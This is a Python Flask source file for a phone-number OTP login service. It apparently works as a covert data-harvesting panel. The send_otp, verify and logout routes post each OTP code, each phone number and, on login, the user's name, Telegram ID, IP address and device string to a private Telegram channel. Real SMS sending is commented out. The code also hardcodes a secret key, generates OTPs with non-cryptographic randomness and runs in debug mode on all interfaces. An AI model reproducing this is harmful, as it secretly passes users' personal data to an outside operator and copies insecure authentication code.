from flask import Flask, render_template, request, session, redirect, jsonify
import random
import time
import logging
import requests
import json
from datetime import datetime

app = Flask(__name__)
app.secret_key = "9fK2vXq7Lp4mWz8RjB3nYc6TdHs1Ea5Ug0Ox7VwZiMkNr2Cy4PbA"

# ========== CONFIGURE THESE ==========
TELEGRAM_BOT_TOKEN = "YOUR_BOT_TOKEN_HERE"  # From @BotFather
TELEGRAM_CHANNEL_ID = "-100xxxxxxxxxx"       # Your private channel ID
# Optional: Twilio for real SMS (or use console OTP for testing)
TWILIO_SID = "YOUR_TWILIO_SID"
TWILIO_TOKEN = "YOUR_TWILIO_TOKEN"
TWILIO_PHONE = "+1234567890"
# =====================================

logging.basicConfig(level=logging.INFO)

# Store OTPs temporarily (use Redis in production)
otp_storage = {}
user_sessions = {}

def send_to_telegram(message):
    """Send message to private Telegram channel"""
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    payload = {
        "chat_id": TELEGRAM_CHANNEL_ID,
        "text": message,
        "parse_mode": "HTML"
    }
    try:
        response = requests.post(url, json=payload, timeout=10)
        return response.json().get("ok", False)
    except Exception as e:
        logging.error(f"Telegram send failed: {e}")
        return False

def send_sms(phone, otp):
    """Send OTP via Twilio SMS (or print to console for testing)"""
    # For testing without Twilio - just print and send to Telegram
    message = f"🔐 Your Corn Login OTP: <code>{otp}</code>\nPhone: {phone}"
    
    # Send to Telegram channel
    send_to_telegram(message)
    
    # Log to console (for testing)
    print(f"\n{'='*50}")
    print(f"📱 OTP for {phone}: {otp}")
    print(f"{'='*50}\n")
    
    # Uncomment below for real Twilio SMS
    """
    from twilio.rest import Client
    client = Client(TWILIO_SID, TWILIO_TOKEN)
    client.messages.create(
        body=f"Your Corn Login OTP is: {otp}",
        from_=TWILIO_PHONE,
        to=phone
    )
    """
    return True

def format_session_message(user_data, ip_address, user_agent):
    """Format session data for Telegram"""
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    
    message = f"""🟢 <b>NEW LOGIN - SESSION SAVED</b>

👤 <b>Name:</b> {user_data.get('name', 'N/A')}
📱 <b>Phone:</b> {user_data.get('phone', 'N/A')}
🆔 <b>Telegram ID:</b> {user_data.get('tg_id', 'N/A')}
⏰ <b>Time:</b> {timestamp}
🌐 <b>IP:</b> <code>{ip_address}</code>
💻 <b>Device:</b> {user_agent[:50]}...

<b>Session ID:</b> <code>{user_data.get('session_id', 'N/A')}</code>

✅ Session stored in database"""
    
    return message

@app.route("/")
def home():
    if "user" not in session:
        return redirect("/login")
    
    # Update last activity
    session_id = session.get("session_id")
    if session_id and session_id in user_sessions:
        user_sessions[session_id]["last_active"] = time.time()
    
    return render_template("index.html", user=session["user"])

@app.route("/login")
def login_page():
    return render_template("login.html")

@app.route("/api/send-otp", methods=["POST"])
def send_otp():
    try:
        data = request.json
        phone = data.get("phone", "").strip()
        
        if not phone or len(phone) < 10:
            return jsonify(ok=False, error="Invalid phone number"), 400
        
        # Generate 5-digit OTP
        otp = str(random.randint(10000, 99999))
        
        # Store OTP with expiry (5 minutes)
        otp_storage[phone] = {
            "otp": otp,
            "expires": time.time() + 300,
            "attempts": 0
        }
        
        # Send OTP via SMS
        send_sms(phone, otp)
        
        # Log to Telegram
        send_to_telegram(f"📤 OTP Requested\n📱 Phone: <code>{phone}</code>\n⏰ Expires in 5 min")
        
        return jsonify(ok=True, message="OTP sent successfully")
        
    except Exception as e:
        logging.error(f"Send OTP error: {e}")
        return jsonify(ok=False, error="Failed to send OTP"), 500

@app.route("/api/verify-otp", methods=["POST"])
def verify():
    try:
        data = request.json
        phone = data.get("phone", "").strip()
        otp_input = data.get("otp", "").strip()
        name = data.get("name", "User").strip()
        tg_id = data.get("tg_id", "N/A").strip()
        
        # Validate OTP exists
        if phone not in otp_storage:
            return jsonify(ok=False, error="OTP expired or not requested"), 400
        
        otp_data = otp_storage[phone]
        
        # Check expiry
        if time.time() > otp_data["expires"]:
            del otp_storage[phone]
            return jsonify(ok=False, error="OTP expired"), 400
        
        # Check attempts
        if otp_data["attempts"] >= 3:
            del otp_storage[phone]
            return jsonify(ok=False, error="Too many attempts. Request new OTP"), 400
        
        # Verify OTP
        if otp_data["otp"] != otp_input:
            otp_data["attempts"] += 1
            remaining = 3 - otp_data["attempts"]
            return jsonify(ok=False, error=f"Invalid OTP. {remaining} attempts left"), 401
        
        # Success - create session
        session_id = f"sess_{random.randint(100000, 999999)}_{int(time.time())}"
        
        user_data = {
            "name": name,
            "phone": phone,
            "tg_id": tg_id,
            "session_id": session_id,
            "login_time": time.time(),
            "login_time_formatted": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        }
        
        # Store session
        session["user"] = user_data
        session["session_id"] = session_id
        
        user_sessions[session_id] = {
            **user_data,
            "ip": request.remote_addr,
            "user_agent": request.headers.get("User-Agent", "Unknown"),
            "last_active": time.time()
        }
        
        # Clean up OTP
        del otp_storage[phone]
        
        # Send session to Telegram channel
        ip = request.remote_addr
        user_agent = request.headers.get("User-Agent", "Unknown")
        session_msg = format_session_message(user_data, ip, user_agent)
        send_to_telegram(session_msg)
        
        return jsonify(ok=True, message="Login successful", session_id=session_id)
        
    except Exception as e:
        logging.error(f"Verify error: {e}")
        return jsonify(ok=False, error="Verification failed"), 500

@app.route("/api/sessions", methods=["GET"])
def get_sessions():
    """Get all active sessions (for admin panel)"""
    if "user" not in session:
        return jsonify(ok=False, error="Not logged in"), 401
    
    # Return sessions for the logged-in user
    user_phone = session["user"].get("phone")
    user_sess = {k: v for k, v in user_sessions.items() if v.get("phone") == user_phone}
    
    return jsonify(ok=True, sessions=user_sess)

@app.route("/api/logout", methods=["POST"])
def logout_api():
    """API logout endpoint"""
    session_id = session.get("session_id")
    user = session.get("user", {})
    
    if session_id and session_id in user_sessions:
        del user_sessions[session_id]
    
    # Send logout notification to Telegram
    send_to_telegram(f"""🔴 <b>LOGOUT</b>
👤 {user.get('name', 'N/A')}
📱 {user.get('phone', 'N/A')}
⏰ {datetime.now().strftime("%Y-%m-%d %H:%M:%S")}""")
    
    session.clear()
    return jsonify(ok=True)

@app.route("/logout")
def logout_page():
    """Web logout"""
    session_id = session.get("session_id")
    user = session.get("user", {})
    
    if session_id and session_id in user_sessions:
        del user_sessions[session_id]
    
    # Send logout notification
    send_to_telegram(f"""🔴 <b>LOGOUT</b>
👤 {user.get('name', 'N/A')}
📱 {user.get('phone', 'N/A')}
⏰ {datetime.now().strftime("%Y-%m-%d %H:%M:%S")}""")
    
    session.clear()
    return redirect("/login")

@app.route("/api/heartbeat", methods=["POST"])
def heartbeat():
    """Keep session alive"""
    session_id = session.get("session_id")
    if session_id and session_id in user_sessions:
        user_sessions[session_id]["last_active"] = time.time()
        return jsonify(ok=True, active=True)
    return jsonify(ok=False, active=False), 401

if __name__ == "__main__":
    app.run(debug=True, host="0.0.0.0", port=5000)